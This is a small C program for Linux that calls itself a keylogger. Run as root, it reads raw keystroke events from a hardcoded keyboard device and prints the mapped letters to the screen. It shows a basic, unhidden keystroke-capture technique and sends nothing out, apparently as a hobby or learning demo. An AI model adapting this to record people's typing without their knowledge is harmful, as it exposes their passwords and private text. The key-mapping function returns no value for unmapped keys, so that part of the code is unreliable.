// Not a Keylogger, trust me
//
// This program reads keys from the keyboard buffer
// and displays them on screen.
//
// Usage: sudo ./naktm
// MUST RUN AS SUPERUSER!
// MUST SPECIFY YOUR DEVICE EVENT TO READ FROM.
// SEE COMMENTS AT THE BEGINNING OF MAIN!
//
// for extra fun, run xev from terminal
// ====================================

#include <errno.h>
#include <stdlib.h>
#include <fcntl.h>
#include <linux/input.h> // key defines can be found in here
#include <stdio.h>
#include <string.h>
#include <stdio.h>
#include <unistd.h>
//#include <sstream>

#define KEYPRESSED 1
#define KEYRELEASED 0


/* Map for U.S. standard keyboard layout */
/* Only partially mapped currently. */
char keyMap(u_int16_t input){

    switch(input) {
        case 16: return 'q';
        case 17: return 'w';
        case 18: return 'e';
        case 19: return 'r';
        case 20: return 't';
        case 21: return 'y';
        case 22: return 'u';
        case 23: return 'i';
        case 24: return 'o';
        case 25: return 'p';

        case 30: return 'a';
        case 31: return 's';
        case 32: return 'd';
        case 33: return 'f';
        case 34: return 'g';
        case 35: return 'h';
        case 36: return 'j';
        case 37: return 'k';
        case 38: return 'l';

        case 44: return 'z';
        case 45: return 'x';
        case 46: return 'c';
        case 47: return 'v';
        case 48: return 'b';
        case 49: return 'n';
        case 50: return 'm';
        case 51: return ',';
        case 52: return '.';

        case 57: return ' ';

        default: break;
    }
}


int main() {

    // let's be verbose for now to debug our program.
    printf("NaKtm keylogger started.\n");
    fflush(stdout);

    /* char* keyboard hardcoded for now. Future version would
     * scan devices and choose the correct device.
     *
     * Device info is available with the command
     * cat /proc/bus/input/devices
     * Look for the device event associated with the keyboard.
     * for example, I have two keyboards attached. One appears
     * as event3 and the other event 4. */
    char* keyboard = "/dev/input/event4";

    int fd = 0; /* file descriptor */
    int rd; /* number of bytes read */
    unsigned int scancode = 0;

    /* attempt to open the keyboard file */
    if ( (fd = open(keyboard, O_RDONLY)) > 0){
        struct input_event event; /* buffer to hold reads from keyboard */
        printf("Keyboard file opened successfully! \n");

        /* infinite loop to read keystrokes from file. */
        /* read() will block until there is data to read. */
        /* attempting to read the entire input event and store it in event */
        while ( (rd = read(fd, &event, sizeof(struct input_event))) ) {
            fflush(stdout);
            if (event.type == EV_KEY) /* if the event was a keyboard event */
                if (event.value == 0){ /* only read on the release of the key, not the press */
                    fprintf(stdout,"%c", keyMap(event.code));
                }
        }

    } else {
        fprintf(stderr, "Error: Couldn't open keyboard file -- %s", strerror(errno));
        exit(1);
    }

    return 0;
}
